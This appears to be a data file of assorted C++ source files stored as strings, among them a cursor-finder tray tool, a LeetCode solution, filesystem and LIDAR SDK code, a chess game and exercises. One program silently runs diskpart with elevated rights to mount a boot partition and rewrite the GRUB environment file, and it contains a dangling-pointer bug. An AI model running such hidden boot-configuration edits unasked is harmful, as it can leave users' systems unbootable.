flutter_controller_->engine()->SetNextFrameCallback([&]() {\n    this->Show();\n  });\n\n  return true;\n}\n\nvoid FlutterWindow::OnDestroy() {\n  if (flutter_controller_) {\n    flutter_controller_ = nullptr;\n  }\n\n  Win32Window::OnDestroy();\n}\n\nLRESULT\nFlutterWindow::MessageHandler(HWND hwnd, UINT const message,\n                              WPARAM const wparam,\n                              LPARAM const lparam) noexcept {\n  // Give Flutter, including plugins, an opportunity to handle window messages.\n  if (flutter_controller_) {\n    std::optional<LRESULT> result =\n        flutter_controller_->HandleTopLevelWindowProc(hwnd, message, wparam,\n                                                      lparam);\n    if (result) {\n      return *result;\n    }\n  }\n\n  switch (message) {\n    case WM_FONTCHANGE:\n      flutter_controller_->engine()->ReloadSystemFonts();\n      break;\n  }\n\n  return Win32Window::MessageHandler(hwnd, message, wparam, lparam);\n}\n",
    "#define _WIN32_WINNT 0x0601\r\n#define WIN32_LEAN_AND_MEAN\r\n#define OEMRESOURCE\r\n\r\n// clang-format off\r\n#include <atlbase.h>\r\n#include <shellapi.h>\r\n#include <chrono>\r\n#include <cmath>\r\n#include <fstream>\r\n#include <iomanip>\r\n#include <iostream>\r\n#include <memory>\r\n#include <sstream>\r\n#include <deque>\r\n#include <vector>\r\n#include <stdexcept>\r\n#include \"resource.h\"\r\n#include <taskschd.h>\r\n#include <comdef.h>\r\n#pragma comment(lib, \"taskschd.lib\")\r\n#pragma comment(lib, \"comsupp.lib\")\r\n\r\n\r\n\r\n// Configuration class to manage all configurable parameters\r\nclass CursorConfig {\r\n public:\r\n  static constexpr double kScaleFactor = 3.0;           // Cursor enlargement factor\r\n  static constexpr size_t kHistorySize = 10;            // Keep last 10 movements\r\n  static constexpr int kMinDirectionChanges = 5;        // Minimum direction changes required\r\n  static constexpr double kMinMovementSpeed = 800.0;    // Minimum speed in pixels/second\r\n  static constexpr int kMaxTimeWindow = 500;            // Time window in milliseconds\r\n  static constexpr int kEnlargeDurationMs = 500;        // Cursor enlargement duration (milliseconds)\r\n  static constexpr UINT_PTR kTimerId = 1;               // Timer ID\r\n  static constexpr UINT kTimerInterval = 100;           // Timer interval (milliseconds)\r\n  static constexpr UINT kTrayIconId = 1;                // Tray icon ID\r\n  static constexpr UINT kTrayIconMessage = WM_APP + 1;  // Tray message ID\r\n  static constexpr UINT kMenuExitId = 2000;             // Exit menu item ID\r\n  static constexpr UINT kMenuAutoStartId = 2001;        // Enable auto-start menu item ID\r\n  static constexpr UINT kMenuDisableAutoStartId = 2002; // Disable auto-start menu item ID\r\n\r\n  enum class MouseTrackingMode {\r\n    kHook,    // Use SetWindowsHookEx\r\n    kPolling  // Use GetCursorPos in WM_TIMER\r\n  };\r\n};\r\n\r\n// clang-format on\r\n\r\nclass Logger {\r\n public:\r\n  static Logger& GetInstance() {\r\n    static Logger instance;\r\n    return instance;\r\n  }\r\n\r\n  void Log(const std::string& message) {\r\n    std::ofstream log_file(\"ShakeToFindCursor.log\", std::ios_base::app);\r\n    if (log_file.is_open()) {\r\n      log_file << GetTimestamp() << \" - \" << message << std::endl;\r\n    }\r\n  }\r\n\r\n private:\r\n  Logger() = default;\r\n  Logger(const Logger&) = delete;\r\n  Logger& operator=(const Logger&) = delete;\r\n\r\n  std::string GetTimestamp() {\r\n    auto now = std::chrono::system_clock::now();\r\n    auto now_time_t = std::chrono::system_clock::to_time_t(now);\r\n    std::tm now_tm;\r\n    localtime_s(&now_tm, &now_time_t);\r\n    std::stringstream ss;\r\n    ss << std::put_time(&now_tm, \"%Y-%m-%d %H:%M:%S\");\r\n    return ss.str();\r\n  }\r\n};\r\n\r\n#ifdef _DEBUG\r\n#define DEBUG_LOG(msg) Logger::GetInstance().Log(msg)\r\n#else\r\n#define DEBUG_LOG(msg)\r\n#endif\r\n\r\n// COM initialization class\r\nclass ComInitializer {\r\n public:\r\n  ComInitializer() {\r\n    if (FAILED(CoInitializeEx(nullptr, COINIT_MULTITHREADED))) {\r\n      throw std::runtime_error(\"Failed to initialize COM\");\r\n    }\r\n  }\r\n\r\n  ~ComInitializer() { CoUninitialize(); }\r\n};\r\n\r\n// Auto-start manager class to enable/disable auto-start\r\nclass AutoStartManager {\r\n public:\r\n  static bool IsAutoStartEnabled() {\r\n    CComPtr<ITaskService> task_service;\r\n    HRESULT hr = task_service.CoCreateInstance(CLSID_TaskScheduler, nullptr,\r\n                                               CLSCTX_INPROC_SERVER);\r\n    if (FAILED(hr)) return false;\r\n\r\n    hr = task_service->Connect(_variant_t(), _variant_t(), _variant_t(),\r\n                               _variant_t());\r\n    if (FAILED(hr)) return false;\r\n\r\n    CComPtr<ITaskFolder> root_folder;\r\n    hr = task_service->GetFolder(_bstr_t(L\"\\\\\"), &root_folder);\r\n    if (FAILED(hr)) return false;\r\n\r\n    CComPtr<IRegisteredTask> task;\r\n    hr = root_folder->GetTask(_bstr_t(L\"ShakeToFindCursor\"), &task);\r\n\r\n    return SUCCEEDED(hr) && task != nullptr;\r\n  }\r\n\r\n  static bool EnableAutoStart() {\r\n    WCHAR exe_path[MAX_PATH];\r\n    if (!GetModuleFileNameW(nullptr, exe_path, MAX_PATH)) return false;\r\n\r\n    CComPtr<ITaskService> task_service;\r\n    HRESULT hr = task_service.CoCreateInstance(CLSID_TaskScheduler, nullptr,\r\n                                               CLSCTX_INPROC_SERVER);\r\n    if (FAILED(hr)) return false;\r\n\r\n    hr = task_service->Connect(_variant_t(), _variant_t(), _variant_t(),\r\n                               _variant_t());\r\n    if (FAILED(hr)) return false;\r\n\r\n    CComPtr<ITaskFolder> root_folder;\r\n    hr = task_service->GetFolder(_bstr_t(L\"\\\\\"), &root_folder);\r\n    if (FAILED(hr)) return false;\r\n\r\n    // Delete existing task if present\r\n    root_folder->DeleteTask(_bstr_t(L\"ShakeToFindCursor\"), 0);\r\n\r\n    CComPtr<ITaskDefinition> task;\r\n    hr = task_service->NewTask(0, &task);\r\n    if (FAILED(hr)) return false;\r\n\r\n    // Set general info\r\n    CComPtr<IRegistrationInfo> reg_info;\r\n    hr = task->get_RegistrationInfo(&reg_info);\r\n    if (SUCCEEDED(hr)) {\r\n      reg_info->put_Author(_bstr_t(L\"ShakeToFindCursor\"));\r\n      reg_info->put_Description(\r\n          _bstr_t(L\"Auto-",
    "/*You are given two strings word1 and word2. Merge the strings by adding letters in alternating order, starting with word1. If a string is longer than the other, append the additional letters onto the end of the merged string.\n\nReturn the merged string.\n\n \n\nExample 1:\n\nInput: word1 = \"abc\", word2 = \"pqr\"\nOutput: \"apbqcr\"\nExplanation: The merged string will be merged as so:\nword1:  a   b   c\nword2:    p   q   r\nmerged: a p b q c r\nExample 2:\n\nInput: word1 = \"ab\", word2 = \"pqrs\"\nOutput: \"apbqrs\"\nExplanation: Notice that as word2 is longer, \"rs\" is appended to the end.\nword1:  a   b \nword2:    p   q   r   s\nmerged: a p b q   r   s\nExample 3:\n\nInput: word1 = \"abcd\", word2 = \"pq\"\nOutput: \"apbqcd\"\nExplanation: Notice that as word1 is longer, \"cd\" is appended to the end.\nword1:  a   b   c   d\nword2:    p   q \nmerged: a p b q c   d\n\nConstraints:\n\n1 <= word1.length, word2.length <= 100\nword1 and word2 consist of lowercase English letters.*/\n//<b>Solution: </b>\nclass Solution {\npublic:\n    string mergeAlternately(string word1, string word2) {\n        string res;\n        int len1 = word1.size();\n        int len2 = word2.size();\n        int i = 0, j = 0;\n        while (i < len1 && j < len2) {\n            res += word1[i++];\n            res += word2[j++];\n        }\n        while (i < len1) {\n            res += word1[i++];\n        }\n        while (j < len2) {\n            res += word2[j++];\n        }\n        return res;\n    }\n};\n\n",
    "/*\n *  Copyright (c) 2022 NetEase Inc.\n *\n *  Licensed under the Apache License, Version 2.0 (the \"License\");\n *  you may not use this file except in compliance with the License.\n *  You may obtain a copy of the License at\n *\n *      http://www.apache.org/licenses/LICENSE-2.0\n *\n *  Unless required by applicable law or agreed to in writing, software\n *  distributed under the License is distributed on an \"AS IS\" BASIS,\n *  WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.\n *  See the License for the specific language governing permissions and\n *  limitations under the License.\n */\n\n/*\n * Project: dingo\n * Created Date: 2022-03-25\n * Author: chengyi01\n */\n\n#include \"tools/query/dingofs_inode_s3infomap.h\"\n\n#include <algorithm>\n#include <iostream>\n#include <memory>\n\n#include \"utils/string_util.h\"\n\nDECLARE_string(metaserverAddr);\nDECLARE_string(poolId);\nDECLARE_string(copysetId);\nDECLARE_string(partitionId);\nDECLARE_string(fsId);\nDECLARE_string(inodeId);\nDECLARE_uint32(rpcStreamIdleTimeoutMs);\n\nnamespace dingofs {\nnamespace tools {\nnamespace query {\n\nInodeBase TraslateInodeBase(\n    const pb::metaserver::GetOrModifyS3ChunkInfoRequest& source) {\n  InodeBase target;\n  target.set_poolid(source.poolid());\n  target.set_copysetid(source.copysetid());\n  target.set_partitionid(source.partitionid());\n  target.set_fsid(source.fsid());\n  target.set_inodeid(source.inodeid());\n  return target;\n}\n\nvoid InodeS3InfoMapTool::PrintHelp() {\n  DingofsToolRpc::PrintHelp();\n  std::cout << \" -poolId=\" << FLAGS_poolId << \" -copysetId=\" << FLAGS_copysetId\n            << \" -partitionId=\" << FLAGS_partitionId << \" -fsId=\" << FLAGS_fsId\n            << \" -inodeId=\" << FLAGS_inodeId\n            << \" [-metaserverAddr=\" << FLAGS_metaserverAddr\n            << \" -rpcStreamIdleTimeoutMs=\" << FLAGS_rpcStreamIdleTimeoutMs\n            << \"]\";\n  std::cout << std::endl;\n}\n\nvoid InodeS3InfoMapTool::AddUpdateFlags() {\n  AddUpdateFlagsFunc(dingofs::tools::SetMetaserverAddr);\n  AddUpdateFlagsFunc(dingofs::tools::SetRpcStreamIdleTimeoutMs);\n}\n\nint InodeS3InfoMapTool::Init() {\n  if (DingofsToolRpc::Init() != 0) {\n    return -1;\n  }\n\n  dingofs::utils::SplitString(FLAGS_metaserverAddr, \",\", &hostsAddr_);\n\n  std::vector<std::string> poolsId;\n  dingofs::utils::SplitString(FLAGS_poolId, \",\", &poolsId);\n\n  std::vector<std::string> copysetsId;\n  dingofs::utils::SplitString(FLAGS_copysetId, \",\", &copysetsId);\n\n  std::vector<std::string> partitionId;\n  dingofs::utils::SplitString(FLAGS_partitionId, \",\", &partitionId);\n\n  std::vector<std::string> fsId;\n  dingofs::utils::SplitString(FLAGS_fsId, \",\", &fsId);\n\n  std::vector<std::string> inodeId;\n  dingofs::utils::SplitString(FLAGS_inodeId, \",\", &inodeId);\n\n  if (poolsId.size() != copysetsId.size() ||\n      poolsId.size() != partitionId.size() || poolsId.size() != fsId.size() ||\n      poolsId.size() != inodeId.size()) {\n    std::cout << \"fsId:\" << FLAGS_fsId << \" poolId:\" << FLAGS_poolId\n              << \" copysetId:\" << FLAGS_copysetId\n              << \" partitionId:\" << FLAGS_partitionId\n              << \" inodeId:\" << FLAGS_inodeId << \" must be the same size\"\n              << std::endl;\n    return -1;\n  }\n\n  for (size_t i = 0; i < poolsId.size(); ++i) {\n    pb::metaserver::GetOrModifyS3ChunkInfoRequest request;\n    request.set_poolid(std::stoul((poolsId[i])));\n    request.set_copysetid(std::stoul((copysetsId[i])));\n    request.set_partitionid(std::stoul((partitionId[i])));\n    request.set_fsid(std::stoul((fsId[i])));\n    request.set_inodeid(std::stoull((inodeId[i])));\n    request.set_returns3chunkinfomap(true);\n    SetStreamingRpc(true);\n    request.set_supportstreaming(isStreaming_);\n    AddRequest(request);\n  }\n\n  service_stub_func_ =\n      std::bind(&pb::metaserver::MetaServerService_Stub::GetOrModifyS3ChunkInfo,\n                service_stub_.get(), std::placeholders::_1,\n                std::placeholders::_2, std::placeholders::_3, nullptr);\n  SetReceiveCallback();\n  return 0;\n}\n\nbool InodeS3InfoMapTool::AfterSendRequestToHost(const std::string& host) {\n  bool ret = false;\n  if (controller_->Failed()) {\n    errorOutput_ << \"send request \" << \" to metaserver: \" << host\n                 << \" failed, errorcode= \" << controller_->ErrorCode()\n                 << \", error text \" << controller_->ErrorText() << \"\\n\";\n  } else {\n    if (response_->statuscode() == pb::metaserver::MetaStatusCode::OK) {\n      if (!isStreaming_) {\n        if (response_->s3chunkinfomap_size() == 0) {\n          UpdateInode2S3ChunkInfoList_(TraslateInodeBase(requestQueue_.front()),\n                                       S3ChunkInfoList());\n        }\n        for (auto const& list : response_->s3chunkinfomap()) {\n          UpdateInode2S3ChunkInfoList_(TraslateInodeBase(requestQueue_.front()),\n                                       list.second);\n        }\n      }\n      if (show_) {\n        if (isStreaming_) {\n          for (auto const& i : inode2S3ChunkInfoList_) {\n            std::cout << \"fsId: \" << i.first.fsid()\n          ",
    "/*\n *  Slamtec LIDAR SDK\n *\n *  Copyright (c) 2014 - 2023 Shanghai Slamtec Co., Ltd.\n *  http://www.slamtec.com\n *\n */\n\n /*\n  *  Sample Data Unpacker System\n  *  Capsule Style Sample Node Handlers\n  */\n\n  /*\n\t* Redistribution and use in source and binary forms, with or without\n\t* modification, are permitted provided that the following conditions are met:\n\t*\n\t* 1. Redistributions of source code must retain the above copyright notice,\n\t*    this list of conditions and the following disclaimer.\n\t*\n\t* 2. Redistributions in binary form must reproduce the above copyright notice,\n\t*    this list of conditions and the following disclaimer in the documentation\n\t*    and/or other materials provided with the distribution.\n\t*\n\t* THIS SOFTWARE IS PROVIDED BY THE COPYRIGHT HOLDERS AND CONTRIBUTORS \"AS IS\"\n\t* AND ANY EXPRESS OR IMPLIED WARRANTIES, INCLUDING, BUT NOT LIMITED TO,\n\t* THE IMPLIED WARRANTIES OF MERCHANTABILITY AND FITNESS FOR A PARTICULAR\n\t* PURPOSE ARE DISCLAIMED. IN NO EVENT SHALL THE COPYRIGHT HOLDER OR\n\t* CONTRIBUTORS BE LIABLE FOR ANY DIRECT, INDIRECT, INCIDENTAL, SPECIAL,\n\t* EXEMPLARY, OR CONSEQUENTIAL DAMAGES (INCLUDING, BUT NOT LIMITED TO,\n\t* PROCUREMENT OF SUBSTITUTE GOODS OR SERVICES; LOSS OF USE, DATA, OR PROFITS;\n\t* OR BUSINESS INTERRUPTION) HOWEVER CAUSED AND ON ANY THEORY OF LIABILITY,\n\t* WHETHER IN CONTRACT, STRICT LIABILITY, OR TORT (INCLUDING NEGLIGENCE OR\n\t* OTHERWISE) ARISING IN ANY WAY OUT OF THE USE OF THIS SOFTWARE,\n\t* EVEN IF ADVISED OF THE POSSIBILITY OF SUCH DAMAGE.\n\t*\n\t*/\n\n#include \"../dataunnpacker_commondef.h\"\n#include \"../dataunpacker.h\"\n#include \"../dataunnpacker_internal.h\"\n\n\n\n#include \"handler_capsules.h\"\n\nBEGIN_DATAUNPACKER_NS()\n\t\nnamespace unpacker{\n\n\n// UnpackerHandler_CapsuleNode\n///////////////////////////////////////////////////////////////////////////////////\n\nstatic _u64 _getSampleDelayOffsetInExpressMode(const SlamtecLidarTimingDesc& timing, int sampleIdx)\n{\n    // FIXME: to eval\n    // \n    // guess channel baudrate by LIDAR model ....\n    const _u64 channelBaudRate = timing.native_baudrate? timing.native_baudrate:115200;\n\n    _u64 tranmissionDelay = 1000000ULL * sizeof(rplidar_response_capsule_measurement_nodes_t) * 10 / channelBaudRate;\n\n    if (timing.native_interface_type == LIDARInterfaceType::LIDAR_INTERFACE_ETHERNET)\n    {\n        tranmissionDelay = 100; //dummy value\n    }\n\n    // center of the sample duration\n    const _u64 sampleDelay = (timing.sample_duration_uS >> 1);\n    const _u64 sampleFilterDelay = timing.sample_duration_uS;\n    const _u64 groupingDelay = (31 - sampleIdx) * timing.sample_duration_uS;\n\n\n    return sampleFilterDelay + sampleDelay + tranmissionDelay + timing.linkage_delay_uS + groupingDelay;\n}\n\n\nUnpackerHandler_CapsuleNode::UnpackerHandler_CapsuleNode()\n    : _cached_scan_node_buf_pos(0)\n    , _is_previous_capsuledataRdy(false)\n    , _cached_last_data_timestamp_us(0)\n{\n    _cached_scan_node_buf.resize(sizeof(rplidar_response_capsule_measurement_nodes_t));\n    memset(&_cachedTimingDesc, 0, sizeof(_cachedTimingDesc));\n}\n\nUnpackerHandler_CapsuleNode::~UnpackerHandler_CapsuleNode()\n{\n\n}\n\nvoid UnpackerHandler_CapsuleNode::onUnpackerContextSet(LIDARSampleDataUnpacker::UnpackerContextType type, const void* data, size_t size)\n{\n    if (type == LIDARSampleDataUnpacker::UNPACKER_CONTEXT_TYPE_LIDAR_TIMING) {\n        assert(size == sizeof(_cachedTimingDesc));\n        _cachedTimingDesc = *reinterpret_cast<const SlamtecLidarTimingDesc*>(data);\n    }\n}\n\n\n_u8 UnpackerHandler_CapsuleNode::getSampleAnswerType() const\n{\n\treturn RPLIDAR_ANS_TYPE_MEASUREMENT_CAPSULED;\n}\n\nvoid UnpackerHandler_CapsuleNode::onData(LIDARSampleDataUnpackerInner* engine, const _u8* data, size_t cnt)\n{\n    for (size_t pos = 0; pos < cnt; ++pos) {\n        _u8 current_data = data[pos];\n        switch (_cached_scan_node_buf_pos) {\n        case 0: // expect the sync bit 1\n        {\n            _u8 tmp = (current_data >> 4);\n            if (tmp == RPLIDAR_RESP_MEASUREMENT_EXP_SYNC_1) {\n                // pass\n            }\n            else {\n                _is_previous_capsuledataRdy = false;\n                continue;\n            }\n\n        }\n        break;\n        case 1: // expect the sync bit 2\n        {\n            _u8 tmp = (current_data >> 4);\n            if (tmp == RPLIDAR_RESP_MEASUREMENT_EXP_SYNC_2) {\n                // pass\n            }\n            else {\n                _cached_scan_node_buf_pos = 0;\n                _is_previous_capsuledataRdy = false;\n                continue;\n            }\n        }\n        break;\n\n        case sizeof(rplidar_response_capsule_measurement_nodes_t) - 1: // new data ready\n        {\n            _cached_scan_node_buf[sizeof(rplidar_response_capsule_measurement_nodes_t) - 1] = current_data;\n            _cached_scan_node_buf_pos = 0;\n\n            rplidar_response_capsule_measurement_nodes_t* node = reinterpret_cast<rplidar_response_capsule_measurement_nodes_t*>(&_cached_scan_node_buf[0]);\n\n            // calc the checksum ...\n            _u8 check",
    "#include <iostream>\r\n#include <vector>\r\n#include <string>\r\n#include <utility>\r\n#include <limits>\r\n\r\nusing namespace std;\r\n\r\nconst int BOARD_SIZE = 8;\r\n\r\n// Chess board setup\r\nvector<vector<string>> board = {\r\n    {\"bR\", \"bN\", \"bB\", \"bQ\", \"bK\", \"bB\", \"bN\", \"bR\"},\r\n    {\"bP\", \"bP\", \"bP\", \"bP\", \"bP\", \"bP\", \"bP\", \"bP\"},\r\n    {\"\", \"\", \"\", \"\", \"\", \"\", \"\", \"\"},\r\n    {\"\", \"\", \"\", \"\", \"\", \"\", \"\", \"\"},\r\n    {\"\", \"\", \"\", \"\", \"\", \"\", \"\", \"\"},\r\n    {\"\", \"\", \"\", \"\", \"\", \"\", \"\", \"\"},\r\n    {\"wP\", \"wP\", \"wP\", \"wP\", \"wP\", \"wP\", \"wP\", \"wP\"},\r\n    {\"wR\", \"wN\", \"wB\", \"wQ\", \"wK\", \"wB\", \"wN\", \"wR\"}\r\n};\r\n\r\n// Display the chess board\r\nvoid displayBoard() {\r\n    for (int i = 0; i < BOARD_SIZE; i++) {\r\n        for (int j = 0; j < BOARD_SIZE; j++) {\r\n            if (board[i][j].empty()) {\r\n                cout << \"-- \";\r\n            } else {\r\n                cout << board[i][j] << \" \";\r\n            }\r\n        }\r\n        cout << endl;\r\n    }\r\n}\r\n\r\n// Get the position from the user\r\npair<int, int> getPosition(const string& prompt) {\r\n    int row, col;\r\n    cout << prompt;\r\n    cin >> row >> col;\r\n\r\n    if (cin.fail() || row < 1 || row > BOARD_SIZE || col < 1 || col > BOARD_SIZE) {\r\n        cin.clear();\r\n        cin.ignore(numeric_limits<streamsize>::max(), '\\n');\r\n        throw invalid_argument(\"Invalid input. Please enter row and column between 1 and 8.\");\r\n    }\r\n\r\n    return {row - 1, col - 1}; // Convert to 0-based index\r\n}\r\n\r\n// Move a piece\r\nbool movePiece(pair<int, int> start, pair<int, int> end) {\r\n    int startRow = start.first;\r\n    int startCol = start.second;\r\n    int endRow = end.first;\r\n    int endCol = end.second;\r\n\r\n    if (startRow < 0 || startRow >= BOARD_SIZE || startCol < 0 || startCol >= BOARD_SIZE ||\r\n        endRow < 0 || endRow >= BOARD_SIZE || endCol < 0 || endCol >= BOARD_SIZE) {\r\n        cout << \"Invalid move: Out of bounds.\" << endl;\r\n        return false;\r\n    }\r\n\r\n    if (board[startRow][startCol].empty()) {\r\n        cout << \"Invalid move: No piece at the starting position.\" << endl;\r\n        return false;\r\n    }\r\n\r\n    if (!board[endRow][endCol].empty() && board[startRow][startCol][0] == board[endRow][endCol][0]) {\r\n        cout << \"Invalid move: Cannot capture your own piece.\" << endl;\r\n        return false;\r\n    }\r\n\r\n    board[endRow][endCol] = board[startRow][startCol];\r\n    board[startRow][startCol].clear();\r\n    return true;\r\n}\r\n\r\nint main() {\r\n    cout << \"Welcome to the Chess Game!\" << endl;\r\n\r\n    while (true) {\r\n        try {\r\n            displayBoard();\r\n\r\n            auto start = getPosition(\"Enter the starting position (row and column): \");\r\n            auto end = getPosition(\"Enter the ending position (row and column): \");\r\n\r\n            if (movePiece(start, end)) {\r\n                cout << \"Move successful.\" << endl;\r\n            } else {\r\n                cout << \"Move failed. Try again.\" << endl;\r\n            }\r\n\r\n        } catch (const exception& e) {\r\n            cout << e.what() << endl;\r\n            continue;\r\n        }\r\n\r\n        char choice;\r\n        cout << \"Do you want to continue? (y/n): \";\r\n        cin >> choice;\r\n        if (choice == 'n' || choice == 'N') {\r\n            break;\r\n        }\r\n    }\r\n\r\n    cout << \"Thanks for playing!\" << endl;\r\n    return 0;\r\n}\r\n",
    "#include \"../exercise.h\"\n\n// READ: \u865a\u51fd\u6570 <https://zh.cppreference.com/w/cpp/language/virtual>\n\nstruct A {\n    virtual char virtual_name() const {\n        return 'A';\n    }\n    char direct_name() const {\n        return 'A';\n    }\n};\nstruct B : public A {\n    // READ: override <https://zh.cppreference.com/w/cpp/language/override>\n    char virtual_name() const override {\n        return 'B';\n    }\n    char direct_name() const {\n        return 'B';\n    }\n};\nstruct C : public B {\n    // READ: final <https://zh.cppreference.com/w/cpp/language/final>\n    char virtual_name() const final {\n        return 'C';\n    }\n    char direct_name() const {\n        return 'C';\n    }\n};\nstruct D : public C {\n    char direct_name() const {\n        return 'D';\n    }\n};\n\nint main(int argc, char **argv) {\n    constexpr auto MSG = \"Replace '?' with its correct name.\";\n\n    A a;\n    B b;\n    C c;\n    D d;\n\n    ASSERT(a.virtual_name() == 'A', MSG);\n    ASSERT(b.virtual_name() == 'B', MSG);\n    ASSERT(c.virtual_name() == 'C', MSG);\n    ASSERT(d.virtual_name() == 'C', MSG);\n    ASSERT(a.direct_name() == 'A', MSG);\n    ASSERT(b.direct_name() == 'B', MSG);\n    ASSERT(c.direct_name() == 'C', MSG);\n    ASSERT(d.direct_name() == 'D', MSG);\n\n    A &rab = b;\n    B &rbc = c;\n    C &rcd = d;\n\n    ASSERT(rab.virtual_name() == 'B', MSG);\n    ASSERT(rbc.virtual_name() == 'C', MSG);\n    ASSERT(rcd.virtual_name() == 'C', MSG);\n    ASSERT(rab.direct_name() == 'A', MSG);\n    ASSERT(rbc.direct_name() == 'B', MSG);\n    ASSERT(rcd.direct_name() == 'C', MSG);\n\n    A &rac = c;\n    B &rbd = d;\n\n    ASSERT(rac.virtual_name() == 'C', MSG);\n    ASSERT(rbd.virtual_name() == 'C', MSG);\n    ASSERT(rac.direct_name() == 'A', MSG);\n    ASSERT(rbd.direct_name() == 'B', MSG);\n\n    A &rad = d;\n\n    ASSERT(rad.virtual_name() == 'C', MSG);\n    ASSERT(rad.direct_name() == 'A', MSG);\n\n    return 0;\n}\n\n// READ: \u6269\u5c55\u9605\u8bfb-\u7eaf\u865a\u3001\u62bd\u8c61 <https://zh.cppreference.com/w/cpp/language/abstract_class>\n// READ: \u6269\u5c55\u9605\u8bfb-\u865a\u7ee7\u627f <https://zh.cppreference.com/w/cpp/language/derived_class>\n",
    "#include <iostream>\n#include <fstream>\n#include <string>\n#include <vector>\n#include <windows.h>\n\nvoid executeCommand(const std::string &command)\n{\n    system(command.c_str());\n}\n\nvoid runAsAdmin(const std::string &command)\n{\n    SHELLEXECUTEINFO sei = {sizeof(sei)};\n    sei.lpVerb = \"runas\";\n    sei.lpFile = \"cmd.exe\";\n    sei.lpParameters = (\"/C \" + command).c_str();\n    sei.nShow = SW_HIDE;\n\n    if (!ShellExecuteEx(&sei))\n    {\n        DWORD dwError = GetLastError();\n        if (dwError == ERROR_CANCELLED)\n        {\n            std::cerr << \"The user refused to allow privileges elevation.\" << std::endl;\n        }\n        else\n        {\n            std::cerr << \"Failed to execute command with elevation.\" << std::endl;\n        }\n    }\n}\n\nvoid insertWordAfterKeyword(const std::string &filename, const std::string &keyword, const std::string &wordToInsert)\n{\n    std::ifstream inputFile(filename, std::ios::binary);\n    if (!inputFile)\n    {\n        MessageBox(NULL, \"Error opening file!\", \"Task Failed\", MB_ICONERROR | MB_OK);\n        return;\n    }\n\n    std::vector<std::string> lines;\n    std::string line;\n    bool wordInserted = false;\n    bool keywordFound = false;\n\n    while (std::getline(inputFile, line))\n    {\n        size_t pos = line.find(keyword);\n        if (pos != std::string::npos && !wordInserted)\n        {\n            keywordFound = true;\n            if (line.find(wordToInsert) == std::string::npos)\n            {\n                line.insert(pos + keyword.length(), wordToInsert);\n                wordInserted = true;\n                MessageBox(NULL, \"Task completed successfully!\", \"Task Success\", MB_ICONINFORMATION | MB_OK);\n            }\n            else\n            {\n                MessageBox(NULL, \"The line already contains the word.\", \"No Action Needed\", MB_ICONINFORMATION | MB_OK);\n            }\n        }\n        lines.push_back(line);\n    }\n    inputFile.close();\n\n    if (!keywordFound)\n    {\n        MessageBox(NULL, \"The keyword was not found in the file.\", \"No Action Needed\", MB_ICONINFORMATION | MB_OK);\n    }\n\n    std::ofstream outputFile(filename, std::ios::binary | std::ios::trunc);\n    for (const auto &l : lines)\n    {\n        outputFile << l << \"\\n\"; // Using LF instead of CRLF\n    }\n\n    // Ensure file size is exactly 1024 bytes\n    outputFile.seekp(0, std::ios::end);\n    size_t fileSize = outputFile.tellp();\n    if (fileSize < 1024)\n    {\n        outputFile.seekp(1024 - 1, std::ios::beg);\n        outputFile.write(\"\", 1);\n    }\n    else if (fileSize > 1024)\n    {\n        std::ifstream infile(filename, std::ios::binary);\n        std::vector<char> buffer(1024);\n        infile.read(buffer.data(), 1024);\n        infile.close();\n\n        std::ofstream outfile(filename, std::ios::binary | std::ios::trunc);\n        outfile.write(buffer.data(), 1024);\n    }\n    outputFile.close();\n}\n\nint WINAPI WinMain(HINSTANCE hInstance, HINSTANCE hPrevInstance, LPSTR lpCmdLine, int nCmdShow)\n{\n    // Create the batch script\n    std::string batchScript = \"(echo sel disk 0 && echo sel part 1 && echo assign letter=z) | diskpart\";\n\n    // Run the batch script with admin privileges\n    runAsAdmin(batchScript);\n\n    // Wait for 3 seconds\n    Sleep(3000);\n\n    // Perform the word insertion task\n    std::string filename = \"Z:\\\\grub\\\\grubenv\"; // Change the path to your desired location\n    std::string keyword = \"next_entry=\";\n    std::string wordToInsert = \"0\";\n    insertWordAfterKeyword(filename, keyword, wordToInsert);\n\n    return 0;\n}\n",
    "#include \"partools.hpp\"\n#include <iostream>\n#include <assert.h>\n\nusing namespace partools;\n\ntemplate <ExecutionPolicy policy>\nint forall_test()\n{\n  int n = 1<<20;\n  HostDevicePointer<int> arr(n);\n\n  MemorySpace m = (policy == GPU) ? Device : Host;\n\n  int *x = arr.write(m);\n\n  forall<policy>(n, [=] PARTOOLS_HOST_DEVICE (int i) mutable\n  {\n    x[i] = 2 * i;\n  });\n\n  const int *y = arr.read<Host>();\n\n  int num_failed = 0;\n  for (int i = 0; i < n; i++)\n  {\n    num_failed += (y[i] != 2 * i);\n  }\n\n  std::string policy_name = (policy == GPU) ? \"GPU\" : (policy == OpenMP) ? \"OpenMP\" : \"Sequential\";\n\n  if (num_failed)\n  {\n    std::cout << \"forall<\" << policy_name << \"> test failed\" << std::endl;\n  }\n  else\n  {\n    std::cout << \"forall<\" << policy_name << \"> test passed\" << std::endl;\n  }\n\n  return num_failed;\n}\n\ntemplate <ExecutionPolicy policy>\nint forall_3d_test()\n{\n  int n = 1<<1;\n  int bx = 8, by = 5, bz = 3;\n\n  HostDevicePointer<int> arr(n * bx * by * bz);\n\n  MemorySpace m = (policy == GPU) ? Device : Host;\n  int *x = arr.write(m);\n\n  forall_3d<policy>(bx, by, bz, n, [=] PARTOOLS_HOST_DEVICE (int l) mutable\n  {\n    thread_for_3d(bx, by, bz, [=](int i, int j, int k) mutable\n    {\n      int idx = i + bx * (j + by * (k + bz * l));\n      int val = 2 * l + 3 * i + 5 * j + 7 * k;\n      x[idx] = val;\n    });\n  });\n\n  const int *y = arr.read<Host>();\n\n  int num_failed = 0;\n\n  for (int l = 0; l < n; l++)\n  {\n    for (int k = 0; k < bz; k++)\n    {\n      for (int j = 0; j < by; j++)\n      {\n        for (int i = 0; i < bx; i++)\n        {\n          int idx = i + bx * (j + by * (k + bz * l));\n          int val = 2 * l + 3 * i + 5 * j + 7 * k;\n          num_failed += (y[idx] != val);\n        }\n      }\n    }\n  }\n\n  std::string policy_name = (policy == GPU) ? \"GPU\" : (policy == OpenMP) ? \"OpenMP\" : \"Sequential\";\n\n  if (num_failed)\n  {\n    std::cout << \"forall_3d<\" << policy_name << \"> test failed\" << std::endl;\n  }\n  else\n  {\n    std::cout << \"forall_3d<\" << policy_name << \"> test passed\" << std::endl;\n  }\n\n  return num_failed;\n}\n\nint main()\n{\n  int failed = 0;\n\n  failed += forall_test<Sequential>();\n\n#ifdef PARTOOLS_USING_GPU\n  failed += forall_test<GPU>();\n#endif\n\n#ifdef PARTOOLS_USING_OPENMP\n  failed 